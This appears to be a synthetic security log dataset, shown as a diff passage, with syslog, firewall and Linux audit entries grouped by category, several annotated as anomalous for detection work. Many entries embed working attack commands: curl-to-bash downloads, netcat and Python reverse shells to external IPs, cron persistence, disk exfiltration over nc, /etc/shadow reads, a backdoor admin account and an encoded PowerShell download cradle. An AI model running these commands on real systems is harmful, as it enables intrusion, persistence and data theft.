+Mar  4 22:19:10 srv01 CRON[9012]: (root) CMD (/usr/bin/curl -I http://185.199.108.153  2>&1)
+Mar  4 22:19:40 srv03 systemd-logind[456]: New session 5678 of user testuser.
+Mar  4 22:20:00 srv02 kernel: [12348.456789] [UFW ALLOW] IN=ens33 OUT= MAC= SRC=192.168.1.10 DST=8.8.8.8 LEN=60 PROTO=UDP SPT=12345 DPT=53
+Mar  4 22:20:30 srv01 auditd[123]: audit: type=1101 audit(1741122030.123:456): pid=23456 uid=0 auid=4294967295 ses=4294967295 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_unix,pam_localuser acct="root" exe="/usr/bin/sudo" hostname=? addr=? terminal=? res=success'
+
+--- Format B: UFW Blocks & Session Logs (20 entries) ---
+
+Mar 15 12:34:56 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=52345 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:34:57 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12346 DF PROTO=TCP SPT=52346 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:34:58 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12347 DF PROTO=TCP SPT=52347 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:34:59 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12348 DF PROTO=TCP SPT=52348 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:35:00 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12349 DF PROTO=TCP SPT=52349 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:35:01 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12350 DF PROTO=TCP SPT=52350 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:35:02 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12351 DF PROTO=TCP SPT=52351 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:35:03 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12352 DF PROTO=TCP SPT=52352 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:35:04 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12353 DF PROTO=TCP SPT=52353 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Mar 15 12:35:05 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:c0:00:08:00:50:56:c0:00:01:08:00 SRC=192.168.1.200 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12354 DF PROTO=TCP SPT=52354 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+
+Mar 15 14:22:33 dbserver01 systemd[1]: Started Session 12345 of user root.
+Mar 15 14:22:34 dbserver01 systemd[1]: Started Session 12346 of user root.
+Mar 15 14:22:35 dbserver01 systemd[1]: Started Session 12347 of user root.
+Mar 15 14:22:36 dbserver01 systemd[1]: Started Session 12348 of user root.
+Mar 15 14:22:37 dbserver01 systemd[1]: Started Session 12349 of user root.
+Mar 15 14:22:38 dbserver01 systemd[1]: Started Session 12350 of user root.
+Mar 15 14:22:39 dbserver01 systemd[1]: Started Session 12351 of user root.
+Mar 15 14:22:40 dbserver01 systemd[1]: Started Session 12352 of user root.
+Mar 15 14:22:41 dbserver01 systemd[1]: Started Session 12353 of user root.
+Mar 15 14:22:42 dbserver01 systemd[1]: Started Session 12354 of user root.
+
+--- Format C: Extended System Logs with Context (10 entries) ---
+
+[LOG-031] [Syslog] 2024-03-15T00:30:04.000Z
+Mar 15 00:30:04 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.0.2.100 DST=10.0.0.5 LEN=40 TOS=0x00 TTL=245 ID=0 DF PROTO=TCP SPT=0 DPT=0 WINDOW=0 [malformed packet: SPT=0 DPT=0 unusual for legitimate traffic]
+
+[LOG-032] [Syslog] 2024-03-15T02:55:17.003Z
+Mar 15 02:55:17 webserver cron[1301]: (root) CMD (curl -s http://198.51.100.77/update.sh | bash) [cron entry added 2024-03-15T02:50:01Z; not present in previous snapshot taken 2024-03-14T23:00:00Z]
+
+[LOG-033] [Syslog] 2024-03-15T06:11:49.120Z
+Mar 15 06:11:49 dbserver01 mysqld[2201]: [Warning] Access denied for user 'root'@'10.0.4.100' (using password: YES) [count=2100 failures in 180s from same IP; normal baseline: 0 remote root attempts]
+
+[LOG-034] [Syslog] 2024-03-15T08:40:00.000Z
+Mar 15 08:40:00 proxy01 squid[8810]: 1710492000.000 14 10.0.1.55 TCP_MISS/200 4398046511104 GET http://legitimate-updates.corp.internal/patch.exe - DIRECT/10.0.1.1 application/octet-stream [file size 4TB anomalous; hash not in approved software inventory]
+
+[LOG-035] [Syslog] 2024-03-15T11:05:22.009Z
+Mar 15 11:05:22 server02 systemd[1]: Started [Service: sshd_backup.service; ExecStart=/tmp/.hidden/sshd -p 2222 -f /tmp/.hidden/sshd_config; binary /tmp/.hidden/sshd was not present in previous boot image]
+
+[LOG-036] [Syslog] 2024-03-15T14:30:01.880Z
+Mar 15 14:30:01 fileserver rsyslog[701]: [ALERT] /var/log/auth.log was truncated from 142MB to 0 bytes by process PID=44021 (bash) UID=0 [log rotation not scheduled until 03/16; manual truncation performed via root shell]
+
+[LOG-037] [Syslog] 2024-03-15T17:02:55.003Z
+Mar 15 17:02:55 server03 kernel: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm python3: reading directory lblock 0 [associated with process writing 840MB/s to /dev/null after reading /etc/shadow]
+
+[LOG-038] [Syslog] 2024-03-15T23:59:00.000Z
+Mar 15 23:59:00 corp-dc01 Microsoft-Windows-Sysmon[1]: Process Create: UtcTime=2024-03-15 23:59:00 ProcessId=9981 Image=C:\Windows\System32\cmd.exe CommandLine=cmd.exe /c "net user backdoor P@ss123! /add & net localgroup administrators backdoor /add" ParentImage=C:\inetpub\wwwroot\upload\shell.aspx
+
+[LOG-039] [Syslog] 2024-03-16T01:14:03.440Z
+Mar 16 01:14:03 server04 kernel: Out of memory: Kill process 30021 (python3) score 998 or sacrifice child [process consumed 31.9GB on 32GB host in 4 minutes; spawned from crontab 60 seconds prior]
+
+[LOG-040] [Syslog] 2024-03-16T04:00:00.000Z
+Mar 16 04:00:00 nas01 samba[5500]: connect to service backup$ from DESKTOP-UNKNOWN (192.168.88.200) as user ANONYMOUS [share not listed in smb.conf; 12000 files read in 90s]
+
+################################################################################
+# CATEGORY 5: PROCESS EXECUTION / AUDIT LOGS (20 entries)
+################################################################################
+
+--- Format A: Linux Audit EXECVE Logs (10 entries) ---
+
+type=EXECVE msg=audit(1741122030.456:789): argc=3 a0="curl" a1="-I" a2="http://45.67.89.123 " exe="/usr/bin/curl" type=SYSCALL msg=audit(1741122030.456:789): arch=c000003e syscall=59 success=yes exit=0 a0=7f8a9b123456 a1=7f8a9b789012 a2=7f8a9b345678 a3=0 items=0 ppid=12345 pid=23456 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
+type=PROCTITLE msg=audit(1741122031.123:790): proctitle=2F62696E2F7368 type=PATH msg=audit(1741122031.123:790): item=0 name="/tmp/.hidden.sh" inode=123456 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
+type=SYSCALL msg=audit(1741122032.789:791): arch=c000003e syscall=59 success=yes exit=0 a0=7ffd12345678 a1=7ffd12345690 a2=0 a3=0 items=2 ppid=5678 pid=9012 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts1 ses=2 comm="wget" exe="/usr/bin/wget" key="exec"
+type=EXECVE msg=audit(1741122033.456:792): argc=4 a0="/bin/bash" a1="-c" a2="nc -e /bin/sh 198.51.100.75 4444" a3=(null) exe="/usr/bin/bash"
+type=PATH msg=audit(1741122034.012:793): item=0 name="/dev/shm/.x" inode=234567 dev=08:01 mode=0100777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1741122035.678:794): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234567890 a1=7f12345678a0 items=0 ppid=11111 pid=22222 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3.10"
+type=PROCTITLE msg=audit(1741122036.234:795): proctitle=2F7573722F62696E2F676363 type=EXECVE msg=audit(1741122036.234:795): argc=2 a0="gcc" a1="-o" a2="/tmp/backdoor" exe="/usr/bin/gcc"
+type=SYSCALL msg=audit(1741122037.890:796): arch=c000003e syscall=59 success=yes exit=0 a0=7ffdabcdef12 a1=7ffdabcdef23 a2=0 a3=0 items=1 ppid=33333 pid=44444 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="base64" exe="/usr/bin/base64"
+type=PATH msg=audit(1741122038.567:797): item=0 name="/var/tmp/.cache" inode=345678 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=EXECVE msg=audit(1741122039.123:798): argc=5 a0="nc" a1="-l" a2="-p" a3="9999" a4="-e" a5="/bin/sh" exe="/bin/nc" type=SYSCALL msg=audit(1741122039.123:798): arch=c000003e syscall=59 success=yes exit=0 a0=7fabcdef1234 a1=7fabcdef5678 a2=7fabcdef9abc a3=0 items=0 ppid=55555 pid=66666 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="nc" exe="/usr/bin/nc" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
+
+--- Format B: Attack Chain Audit Logs (10 entries) ---
+
+type=EXECVE msg=audit(1710507777.123:45678): argc=3 a0="/bin/bash" a1="-c" a2="curl -s http://185.220.101.42:8080/setup.sh  | bash"
+type=EXECVE msg=audit(1710507778.234:45679): argc=2 a0="/usr/bin/wget" a1="http://185.220.101.42:8080/payload.bin  -O /tmp/.hidden/update"
+type=EXECVE msg=audit(1710507779.345:45680): argc=3 a0="/bin/chmod" a1="+x" a2="/tmp/.hidden/update"
+type=EXECVE msg=audit(1710507780.456:45681): argc=1 a0="/tmp/.hidden/update"
+type=EXECVE msg=audit(1710507781.567:45682): argc=3 a0="/bin/bash" a1="-c" a2="nc -e /bin/bash 185.220.101.42 4444"
+type=EXECVE msg=audit(1710507782.678:45683): argc=2 a0="/usr/bin/python3" a1="-c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('185.220.101.42',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+type=EXECVE msg=audit(1710507783.789:45684): argc=3 a0="/bin/bash" a1="-c" a2="echo '*/5 * * * * curl -s http://185.220.101.42:8080/heartbeat  | bash' | crontab -"
+type=EXECVE msg=audit(1710507784.890:45685): argc=3 a0="/usr/bin/sudo" a1="-S" a2="whoami"
+type=EXECVE msg=audit(1710507785.901:45686): argc=2 a0="/bin/cat" a1="/etc/shadow"
+type=EXECVE msg=audit(1710507786.012:45687): argc=3 a0="/usr/bin/scp" a1="/etc/passwd" a2="backup@192.168.1.50:/tmp/exfil_data"
+
+--- Format C: Recon & Enumeration Audit Logs (10 entries) ---
+
+type=EXECVE msg=audit(1710511234.123:56789): argc=2 a0="/usr/bin/ls" a1="-la /root"
+type=EXECVE msg=audit(1710511235.234:56790): argc=2 a0="/usr/bin/cat" a1="/etc/sudoers"
+type=EXECVE msg=audit(1710511236.345:56791): argc=3 a0="/usr/bin/grep" a1="-i" a2="password /var/log/syslog"
+type=EXECVE msg=audit(1710511237.456:56792): argc=3 a0="/bin/netstat" a1="-tulpn" a2=""
+type=EXECVE msg=audit(1710511238.567:56793): argc=2 a0="/usr/bin/ps" a1="aux"
+type=EXECVE msg=audit(1710511239.678:56794): argc=3 a0="/usr/bin/find" a1="/" a2="-name *.conf -type f 2>/dev/null"
+type=EXECVE msg=audit(1710511240.789:56795): argc=2 a0="/usr/bin/last" a1="-a"
+type=EXECVE msg=audit(1710511241.890:56796): argc=3 a0="/bin/cat" a1="/var/log/auth.log" a2=""
+type=EXECVE msg=audit(1710511242.901:56797): argc=3 a0="/usr/bin/tar" a1="-czf" a2="/tmp/archive.tgz /var/www/html"
+type=EXECVE msg=audit(1710511243.012:56798): argc=2 a0="/usr/bin/base64" a1="/tmp/archive.tgz"
+
+--- Format D: Extended Audit with Context (10 entries) ---
+
+[LOG-041] [Audit] 2024-03-15T01:55:00.003Z
+type=EXECVE msg=audit(1710467700.003:1041): argc=4 a0="python3" a1="-c" a2="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('185.220.101.33',4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" ppid=2910 pid=2911 auid=1001 uid=33 gid=33 ses=4 comm="python3" exe="/usr/bin/python3"
+
+[LOG-042] [Audit] 2024-03-15T04:20:11.001Z
+type=SYSCALL msg=audit(1710476411.001:2201): arch=c000003e syscall=59 success=yes exit=0 a0=7f8b1c002c20 a1=7ffd3b4a1d80 a2=7ffd3b4a1da0 items=2 ppid=1 pid=5500 auid=4294967295 uid=0 gid=0 euid=0 egid=0 suid=0 sgid=0 fsuid=0 fsgid=0 tty=(none) ses=4294967295 comm="kthreadd" exe="/usr/bin/kthreadd" [binary masquerades as kernel thread name; spawned from uid=0 bash, not from kernel]
+
+[LOG-043] [Audit] 2024-03-15T07:11:04.009Z
+type=PROCTITLE msg=audit(1710486664.009:3011): proctitle=2F7573722F62696E2F776765742068747470733A2F2F7061737465622E696F2F7261772F585858585858 [decoded: /usr/bin/wget https://pastebin.io/raw/XXXXXXX] ppid=4422 uid=48 user=apache pid=7701 exe="/usr/bin/wget" cwd="/var/www/html/uploads"
+
+[LOG-044] [Audit] 2024-03-15T10:02:44.110Z
+type=EXECVE msg=audit(1710496964.110:4012): argc=3 a0="base64" a1="-d" a2="/tmp/.X11-unix/.cache" ppid=8821 pid=8822 auid=1002 uid=1002 gid=1002 ses=12 comm="base64" exe="/usr/bin/base64" [/tmp/.X11-unix/.cache size=48MB; decoded output piped to /bin/sh; parent: sshd session from 198.51.100.9]
+
+[LOG-045] [Audit] 2024-03-15T13:30:00.000Z
+type=PATH msg=audit(1710509400.000:5200): item=0 name="/etc/cron.d/sysupdate" inode=302913 dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE [file created by PID=12011 (vim) run as UID=1003 (mmartin); /etc/cron.d/ not writable by non-root; setuid bit detected on /usr/local/bin/vim]
+
+[LOG-046] [Audit] 2024-03-15T16:01:33.882Z
+type=EXECVE msg=audit(1710518493.882:6601): argc=5 a0="dd" a1="if=/dev/sda" a2="bs=4M" a3="status=progress" a4="| nc 185.220.101.47 1337" ppid=7700 pid=7801 auid=0 uid=0 gid=0 ses=3 comm="dd" exe="/bin/dd" [reading raw disk device; output piped over network to external IP; no scheduled backup at this time]
+
+[LOG-047] [Audit] 2024-03-15T19:44:09.003Z
+type=SYSCALL msg=audit(1710531849.003:7412): syscall=105 success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=0 ppid=9011 pid=9012 auid=1004 uid=1004 gid=1004 euid=0 egid=0 [setuid(0) succeeded for unprivileged user uid=1004 (jsmith); no corresponding sudo entry; SUID binary involved: /usr/local/bin/pkexec version mismatch]
+
+[LOG-048] [Audit] 2024-03-15T22:00:00.000Z
+type=EXECVE msg=audit(1710540000.000:8100): argc=2 a0="powershell.exe" a1="-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAMAAuADEALwBwAGEAeQBsAG8AYQBkACcAKQA=" ppid=3210 pid=3211 uid=1000 user=bob ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+
+[LOG-049] [Audit] 2024-03-16T00:45:19.441Z
+type=EXECVE msg=audit(1710549919.441:9300): argc=1 a0="/usr/bin/at" ppid=11200 pid=11201 auid=1005 uid=1005 ses=9 [at job scheduled for +1 minute contains: chmod 4755 /bin/bash; submitted from SSH session originating 203.0.113.10; auid=1005 (guest account) not authorized to use at]
+
+[LOG-050] [Audit] 2024-03-16T05:30:00.000Z
+type=EXECVE msg=audit(1710567000.000:10501): argc=3 a0="/usr/bin/find" a1="/" a2="-perm -4000" ppid=14001 pid=14002 auid=1006 uid=1006 gid=1006 ses=14 comm="find" exe="/usr/bin/find" [enumerating all SUID binaries system-wide; 3 seconds after first login; new geo: TH vs previous 90-day logins from DE only; session from 103.77.192.100]
+
+================================================================================
+                              END OF LOG FILE
+================================================================================
+SUMMARY:
+--------
+Category 1 - Network Flow/NetFlow/Zeek:     30 entries
+Category 2 - Auth/SSH/Login:                30 entries
+Category 3 - Firewall/IDS/Snort/Suricata:   30 entries
+Category 4 - Syslog/System:                 20 entries
+Category 5 - Process Execution/Audit:       20 entries
+--------
+TOTAL:                                     130 entries
+================================================================================
